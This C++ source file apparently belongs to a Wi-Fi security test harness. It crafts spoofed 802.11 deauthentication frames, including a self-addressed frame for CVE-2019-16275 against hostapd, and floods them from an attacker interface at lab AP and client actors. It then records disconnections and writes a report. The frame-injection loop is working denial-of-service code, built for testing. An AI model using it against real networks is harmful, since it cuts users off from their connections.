#include <chrono>
#include <nlohmann/json.hpp>
#include <tins/tins.h>

#include "attacks/DoS_soft/deauth/deauth.h"
#include "attacks/components/setup_connections.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "interrupt.h"
#include "logger/log_util.h"
#include "logger/report.h"
#include "observer/tshark_wrapper.h"
#include "visual/result_helper.h"

namespace wpa3_tester::deauth_attack {
using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;

// CVE-2019-16275 / hostapd advisory 2019-7
// Deauth FROM AP TO client
// client with PMF receives it as NL80211_CMD_UNPROT_DEAUTHENTICATE sme_event_unprot_disconnect checks SA==BSSID + reason==CLASS3 -> triggers SA Query.
// Unpatched AP (hostapd < 2.10) does not validate SA of received frames, so an attacker can spoof SA=AP_MAC
// The AP will process or forward in a way that breaks the SA Query exchange
// patched hostapd (>= 2.10) silently drops frames where SA == own_addr before processing.
RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
	Dot11Deauthentication frame(sta_mac, ap_mac);
	frame.addr3(ap_mac);  // BSSID
	frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA - required by sme_event_unprot_disconnect
	RadioTap rt{};
	rt.inner_pdu(frame);
	return rt;
}

// CVE-2019-16275 (w1.fi/security/2019-7) "AP mode PMF disconnection protection bypass"
// deauth addressed TO the AP with SA=AP_MAC (self-addressed).
// - on OLD kernels (~4.x, 2019 era): mac80211 passes the frame to hostapd; unpatched hostapd 2.9
//   processes it in a way that triggers nl80211 INTERFACE-DISABLED, breaking the client's SA Query
// - on MODERN kernels (5.x+): mac80211 appears to filter SA=own_addr frames before they reach
//   hostapd, so INTERFACE-DISABLED is never triggered regardless of hostapd version.
//   The hostapd 2.10 patch (silently drop SA==own_addr before processing) is therefore
//   defence-in-depth for older kernels that still pass the frame through.
// -> reproducible only on old kernels with unpatched hostapd 2.9; kernel 7.x tested: not triggered
RadioTap make_cve_deauth(const HWAddress<6> &ap_mac) {
	Dot11Deauthentication frame(ap_mac, ap_mac); // DA=AP, SA=AP (self-addressed)
	frame.addr3(ap_mac);
	frame.reason_code(7);
	RadioTap rt{};
	rt.inner_pdu(frame);
	return rt;
}

void setup_attack(RunStatus &rs) {
	// WPA2-PSK does not emit EAPOL-4WAY-HS-COMPLETED; use AP-STA-CONNECTED instead
	components::client_ap_setup(rs, false);
}

void run_attack(RunStatus &rs) {
	const auto &att_cfg = rs.config().at("attack_config");
	rs.start_observers();

	const HWAddress<6> ap_mac(rs.get_actor("ap").get(SK::mac));
	const HWAddress<6> sta_mac(rs.get_actor("client").get(SK::mac));
	const string iface = rs.get_actor("attacker").get(SK::iface);

	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));

	log(LogLevel::INFO, "Deauth attack START");
	PacketSender sender{ iface };
	RadioTap frame = make_deauth(ap_mac, sta_mac);
	RadioTap cve_frame = make_cve_deauth(ap_mac);
	const auto end = steady_clock::now() + seconds(att_cfg.at("attack_time"));
	while(steady_clock::now() < end) {
		sender.send(frame);
		sender.send(cve_frame);
		interruptible_sleep(milliseconds(att_cfg.at("ms_interval")));
	}
	log(LogLevel::INFO, "Deauth attack END");

	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
	rs.process_manager.stop_all();
}

void generate_report(const RunStatus &rs) {
	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });

	const path sta_graph = observer::tshark::tshark_graph(rs, "client", elements);
	const path ap_graph = observer::tshark::tshark_graph(rs, "ap", elements);

	report::ReportGuard report(rs.run_folder());
	if(report) {
		report << "# Deauth DoS Attack (WPA2)\n\n";
		report::attack_mapping_table(report, rs);
		if(!sta_graph.empty()) {
			report << "### STA (wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
			report << "![STA Graph](" << sta_graph << ")\n\n";
		}
		if(!ap_graph.empty()) {
			report << "### AP (hostapd " << hostapd::get_version(rs, "ap") << ")\n";
			report << "![AP Graph](" << ap_graph << ")\n\n";
		}
		report << "---\n";
	}
}

void stats_attack(const RunStatus &rs) {

	generate_report(rs);

	nlohmann::json result;
	const auto window = visual::helper::get_run_window(rs);
	result["client_disconnected"] = visual::helper::get_client_disconnected(rs, window);
	// AP-STA-DISCONNECTED fires if AP properly deauths client; INTERFACE-DISABLED fires if
	// the deauth SA==own_addr bug causes nl80211 to bring the AP interface down entirely
	result["ap_disconnected"] = !get_time_logs(rs, "ap", "AP-STA-DISCONNECTED", window).empty();
	result["client_mfp"] = visual::helper::get_client_mfp(rs, window);
	result["ap_WPA_support"] = visual::helper::get_ap_WPA_support(rs);
	result["client_WPA_support"] = visual::helper::get_client_WPA_support(rs, window);

	const TimeWindow w_start{ LogTimePoint{}, get_tag_time(rs.combined_log(), START_tag) };
	result["conn_WPA_version"] = visual::helper::get_conn_WPA_version(rs, w_start);

	rs.save_result(result);
}

}
